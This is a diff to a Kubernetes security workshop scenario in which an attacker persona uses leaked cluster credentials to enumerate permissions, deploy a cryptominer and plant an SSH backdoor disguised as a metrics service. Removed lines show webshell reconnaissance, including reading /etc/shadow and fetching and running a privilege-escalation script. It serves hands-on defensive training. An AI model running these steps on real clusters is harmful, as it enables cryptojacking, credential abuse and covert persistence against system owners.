@@ -12,28 +12,13 @@ In the real world, use good judgment. Don't hurt people, don't get yourself in t
 
 * Opportunist
 * Easy money via crypto-mining
-* Uses automated scans of web IP space for specific issues
-* Leverages off-the-shelf attacks
-* Basic Kubernetes knowledge
+* Uses automated scans of web IP space looking for known exploits and vulnerabilities
 
 ### Motivations
 
-* __Red__’s intrusion-as-a-service provider compromises website and uploads a webshell
-* __Red__ gets the URL of the webshell and wants to deploy some crypto-miners
-
-## Initial Access
-
-__Red__ has been mining `bitcoinero` for a few months now, and it's starting to gain some value.  To capitalize on this bubble, __Red__ uses a service that sells shell access to expand the mining pool.  To find the compromised website, run the following from your Cloud Shell terminal:
-
-# ISSUE: Previous tool used NodePort instead of LB.  Validate no issues with LB
-
-```console
-./attack-1-helper.sh
-```
-
-Log into the URL in a browser, and you should be looking at a working web terminal.
-
-![webshell screenshot](img/webshell.png)
+* __Red__ has been mining `bitcoinero` for a few months now, and it's starting to gain some value
+* __Red__ is looking for free-to-them compute on which to run miners
+* __Red__ purchased some leaked credentials from the dark web
 
 ## Thinking In Graphs
 
@@ -63,107 +48,45 @@ The general process looks like this:
 
     Eventually, you may achieve your goals. Congratulations! Now you can stop hacking and begin dreaming about your next goal.
 
+## Initial Access
+
+__Red__ purchased a bundle of leaked credentials online. One set of credentials appears to be for a publicly accessible kubernetes cluster. They've downloaded the creds and want to connect to the cluster to see what's available.
+
+```console
+cd ./workshop/scenario_1
+export KUBECONFIG=./kubeconfig
+```
+
 ## Getting Some Loot
 
-Since __Red__ already has a shell on a compromised host (Thanks, Natoshi!), the process is fairly simple. They need to identify the resources available to them by poking around, and then run the cryptominer as easily as possible:
+Since __Red__ has high-level credentials to the cluster, the process is fairly simple to start. They need to identify the resources available to them by poking around, and then run the cryptominer as easily as possible.
 
-Let's become __Red__ and try some basic information-gathering commands to get a feel for the environment:
+Let's become __Red__ and try some basic information-gathering commands to get a feel for the environment.
 
-```console
-id
-```
-```console
-uname -a
-```
-```console
-cat /etc/lsb-release /etc/redhat-release
-```
-```console
-ps -ef
-```
-```console
-df -h
-```
-```console
-netstat -nl
-```
-
-Note that the kernel version doesn't match up to the reported OS, and there are very few processes running. This is probably a container.
-
-Let's do some basic checking to see if we can get away with shenanigans. Look around the filesystem. Try downloading and running <a href="http://pentestmonkey.net/tools/audit/unix-privesc-check" target="_blank">a basic Linux config auditor</a> to see if it finds any obvious opportunities. Search a bit on https://www.exploit-db.com/ to see if there's easy public exploits for the kernel.
-
-```console
-cat /etc/shadow
-```
-```console
-ls -l /home
-```
-```console
-ls -l /root
-```
-```console
-cd /tmp; curl https://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz | tar -xzvf -; unix-privesc-check-1.4/unix-privesc-check standard
-```
-
-That's not getting us anywhere. Let's follow-up on that idea that it's maybe a container:
-
-```console
-cd /tmp; curl -L -o amicontained https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64; chmod 555 amicontained; ./amicontained
-```
-
-This tells us several things:
-
-* We are in a container, and it's managed by Kubernetes
-* Some security features are not in use (userns)
-* Seccomp is disabled, but a number of Syscalls are blocked
-* We don't have any exciting capabilities. <a href="http://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank">Click for more capabilities info.</a>
-
-Now let's inspect our Kubernetes environment:
-
-```console
-env | grep -i kube
-```
-```console
-ls /var/run/secrets/kubernetes.io/serviceaccount
-```
-
-We have typical Kubernetes-related environment variables defined, and we have anonymous access to some parts of the Kubernetes API. We can see that the Kubernetes version is modern and supported -- but there's still hope if the Kubernetes security configuration is sloppy. Let's check for that next:
-
-```console
-export PATH=/tmp:$PATH
-cd /tmp; curl -LO https://dl.k8s.io/release/v1.28.10/bin/linux/amd64/kubectl; chmod 555 kubectl
-```
-```console
-kubectl get all
-```
-```console
-kubectl get all -A
-```
+What namespaces are already on the cluster?
 ```console
 kubectl get namespaces
 ```
-
-By default, kubectl will attempt to use the default service account in `/var/run/secrets/kubernetes.io/serviceaccount` -- and it looks like this one has some API access. Note that we can't see anything outside our namespace, though.
-
-Let's inspect what all we __can__ do:
-
+What workloads are in the default namespace?
+```console
+kubectl get all
+```
+What workloads are deployed in all of the namespaces?
+```console
+kubectl get all -A
+```
+What operations can I run on this cluster?
 ```console
 kubectl auth can-i --list
 ```
-
-Can we create pods in this and other namespaces?
-
+Can I create pods?
 ```console
 kubectl auth can-i create pods
-kubectl auth can-i create pods -n dev
-kubectl auth can-i create pods -n prd
-kubectl auth can-i create pods -n kube-system
 ```
 
-Happy day! Our service account is admin in our pod's namespace! Maybe the dashboard on port 31337 needs that much access? Anyway, this gives us what we need to achieve our goals.
-
+It looks like we have hit the jackpot! Let's see if we can start mining some crypto.
 ```console
-cd /tmp; cat > bitcoinero.yml <<EOF
+cat > bitcoinero.yml <<EOF
 apiVersion: apps/v1
 kind: Deployment
 metadata:
@@ -205,11 +128,16 @@ spec:
             memory: 128Mi 
 EOF
 
-./kubectl apply -f bitcoinero.yml
+kubectl apply -f bitcoinero.yml
 sleep 10
-./kubectl get pods
+kubectl get pods
 ```
 
-We can see the bitcoinero pod running, starting to generate us a small but steady stream of cryptocurrency.
+We can see the bitcoinero pod running, starting to generate a small but steady stream of cryptocurrency. But we need to take a few more steps to protect our access to this lucrative opportunity. Let's deploy an SSH server on the cluster to give us a backdoor in case we lose our current access later.
 
-_MISSION ACCOMPLISHED_
+```console
+kubectl apply -n kube-system -f backdoor.yaml
+sleep 10
+echo "Save this IP for Attack Scenario #2"
+kubectl get svc metrics-server-service -n kube-system -o table -o jsonpath='{.status.loadBalancer.ingress[0].ip}'
+```
